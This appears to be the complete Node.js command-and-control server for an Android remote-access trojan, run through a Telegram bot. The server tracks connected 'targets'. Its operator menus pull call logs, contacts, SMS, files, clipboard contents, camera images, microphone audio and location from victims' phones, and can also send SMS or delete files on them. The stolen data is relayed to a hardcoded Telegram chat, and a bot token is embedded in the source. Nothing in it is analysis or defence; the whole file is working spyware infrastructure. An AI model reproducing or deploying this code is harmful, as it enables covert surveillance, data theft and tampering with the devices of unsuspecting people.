require('dotenv').config();
const socket = require('ws');
const http = require('http');
const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const bodyParser = require('body-parser');
const { v4: uuid } = require('uuid');
const axios = require('axios');

const upload = multer();
const app = express();
app.use(bodyParser.json());
const server = http.createServer(app);
const wss = new socket.Server({server});

// Environment variables
const chatId = process.env.TELEGRAM_CHAT_ID || '6508791739';
const token = process.env.TELEGRAM_BOT_TOKEN || '8685714612:AAExAnUcsLTMdlmAMnCwne1xs3wY1IP-iyQ';
const serverAddr = process.env.SERVER_ADDR || '';
const PORT = process.env.PORT || 9000;

const bot = new TelegramBot(token, {polling: true});

// Routes
app.get('/', (req, res) => {
  res.send('Welcome');
});

app.post('/sendFile', upload.single('file'), (req, res) => {
  var filename = req.file.originalname;
  bot.sendDocument(chatId, req.file.buffer, {}, {'filename': filename, 'contentType': 'application/txt'})
    .catch(function(err){
      console.log(err);
    });
  res.send(filename);
});

app.post('/sendText', (req, res) => {
  bot.sendMessage(chatId, req.body.text, {'parse_mode': 'HTML'});
  res.send(req.body.text);
});

app.post('/sendLocation', (req, res) => {
  bot.sendLocation(chatId, req.body.l1, req.body.l2);
  res.send(req.body.l1.toString());
});

server.listen(PORT, () => {
  console.log(`Server started on port ${PORT}`);
});

// WebSocket connection handler
wss.on('connection', (ws, req) => {
  ws.uuid = uuid();
  bot.sendMessage(chatId, 
    `<b>New Target Connected 📱\n\nID = <code>${ws.uuid}</code>\nIP = ${req.socket.remoteAddress.toString().replaceAll('f','').replaceAll(':','')}</b> 🌐`, 
    {'parse_mode': 'HTML'});
});

// Keep-alive ping
setInterval(() => {
  wss.clients.forEach(ws => {
    ws.send('be alive');
  });
}, 2000);

// Bot message handler
bot.on('message', (msg) => {
  const chatId_msg = msg.chat.id;
  
  if (msg.text === '/start') {
    bot.sendMessage(chatId_msg, 'Welcome', {
      'reply_markup': {
        'keyboard': [['Status ⚙'], ['Action ☄']]
      }
    });
  }

  if (msg.text === 'Status ⚙') {
    const clientsCount = wss.clients.size;
    let status = '';
    
    if (clientsCount > 0) {
      status += `<b>${clientsCount} Online Client</b> ✅\n\n`;
      wss.clients.forEach(ws => {
        status += `<b>ID => </b><code>${ws.uuid}</code>\n\n`;
      });
    } else {
      status += '<b>No Online Client</b> ❌';
    }
    
    bot.sendMessage(chatId_msg, status, {'parse_mode': 'HTML'});
  }

  if (msg.text === 'Action ☄') {
    const clientsCount = wss.clients.size;
    
    if (clientsCount > 0) {
      let keyboard = [
        [{'text': 'Call Log 📞', 'callback_data': 'cl'}, {'text': 'All Contact 👤', 'callback_data': 'gc'}],
        [{'text': 'All Sms 💬', 'callback_data': 'ss'}, {'text': 'Send Sms 💬', 'callback_data': 'ss'}],
        [{'text': 'Installed Apps 📲', 'callback_data': 'ia'}, {'text': 'Device Model 📱', 'callback_data': 'dm'}],
        [{'text': 'Get Folder / File 📄', 'callback_data': 'gf'}, {'text': 'Delete Folder / File 🗑', 'callback_data': 'df'}],
        [{'text': 'Main Camera 📷', 'callback_data': 'cam1'}, {'text': 'Front Camera 🤳', 'callback_data': 'cam2'}],
        [{'text': 'Mic 1 🎤', 'callback_data': 'mi1'}, {'text': 'Mic 2 🎤', 'callback_data': 'mi2'}, {'text': 'Mic 3 🎤', 'callback_data': 'mi3'}],
        [{'text': 'Clip Board 📄', 'callback_data': 'cp'}]
      ];
      
      wss.clients.forEach(ws => {
        bot.sendMessage(chatId_msg, 
          `<b>☄ Select Action For Device:</b>\n<b>ID => </b><code>${ws.uuid}</code>`, 
          {
            'reply_markup': {'inline_keyboard': keyboard},
            'parse_mode': 'HTML'
          });
      });
    } else {
      bot.sendMessage(chatId_msg, '<b>No Online Client</b> ❌', {'parse_mode': 'HTML'});
    }
  }

  // Handle file/folder operations
  if (msg.reply_to_message) {
    if (msg.reply_to_message.text.split('&')[0] === 'ss') {
      const deviceId = msg.text.split(']')[0].split('[')[1];
      const clientUuid = msg.reply_to_message.text.split('!')[0].split('&')[1];
      
      wss.clients.forEach(ws => {
        if (ws.uuid === clientUuid) {
          ws.send('send&' + deviceId);
        }
      });
      
      bot.sendMessage(chatId_msg, 'Your Request Is On Progress !', {
        'reply_markup': {'keyboard': [['Status ⚙'], ['Action ☄']]}
      });
    }

    if (msg.reply_to_message.text.split('&')[0] === 'df' || msg.reply_to_message.text.split('&')[0] === 'gf') {
      const fullText = msg.reply_to_message.text;
      const action = fullText.split('!')[0].split('&')[0];
      const clientUuid = fullText.split('!')[0].split('&')[1];
      const filePath = msg.text;
      
      wss.clients.forEach(ws => {
        if (ws.uuid === clientUuid) {
          ws.send(action + '&' + filePath);
        }
      });
      
      bot.sendMessage(chatId_msg, 'Your Request Is On Progress !', {
        'reply_markup': {'keyboard': [['Status ⚙'], ['Action ☄']]}
      });
    }
  }
});

// Bot callback query handler
bot.on('callback_query', function onCallbackQuery(query) {
  const callbackData = query.data;
  const deviceId = query.message.text.split('&')[1];
  
  wss.clients.forEach(ws => {
    if (ws.uuid === deviceId) {
      if (callbackData === 'ss') {
        bot.sendMessage(chatId, 
          `send&${ws.uuid}!\n\n<b>Action Send Sms\n🔵 Please Reply\n</b> <code>[{"number":"target number","message":"your message"}]</code>`, 
          {
            'reply_markup': {'force_reply': true},
            'parse_mode': 'HTML'
          });
      } else if (callbackData === 'gf') {
        bot.sendMessage(chatId, 
          `gf&${ws.uuid}!\n\n<b>Action Get File / Folder\n🔵 Please Reply File / Folder Path:</b>`, 
          {
            'reply_markup': {'force_reply': true},
            'parse_mode': 'HTML'
          });
      } else if (callbackData === 'df') {
        bot.sendMessage(chatId, 
          `df&${ws.uuid}!\n<b>Action Delete File / Folder\n🔵 Please Reply File / Folder Path:</b>`, 
          {
            'reply_markup': {'force_reply': true},
            'parse_mode': 'HTML'
          });
      } else {
        ws.send(callbackData);
      }
    }
  });
});

// Keep server alive
setInterval(() => {
  axios.get(serverAddr).catch(() => {});
}, 120000);
